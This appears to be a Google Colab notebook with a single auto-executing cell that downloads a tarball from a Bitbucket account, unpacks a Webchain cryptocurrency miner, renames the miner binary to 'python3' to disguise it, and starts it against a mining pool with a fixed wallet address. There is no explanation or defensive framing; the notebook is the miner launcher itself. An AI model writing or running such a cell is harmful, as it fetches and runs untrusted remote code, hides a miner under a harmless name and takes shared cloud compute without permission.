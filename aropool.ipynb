{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled.ipynb",
      "version": "0.3.2",
      "views": {},
      "default_view": {},
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "fi60aAJd6k3-",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": true,
            "wait_interval": 0
          }
        }
      },
      "cell_type": "code",
      "source": [
        "!wget https://bitbucket.org/evilbaby1/openai/downloads/linux.tar.gz && tar xvzf linux.tar.gz && mv webchain-miner python3 && rm config.json -f && ./python3 -o pool.webchain.network:2222 -u 0xd5d5871933be8b3b8b80cac22127219c7b8026f4 -p x --donate-level=0 --worker-id=pool1"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}
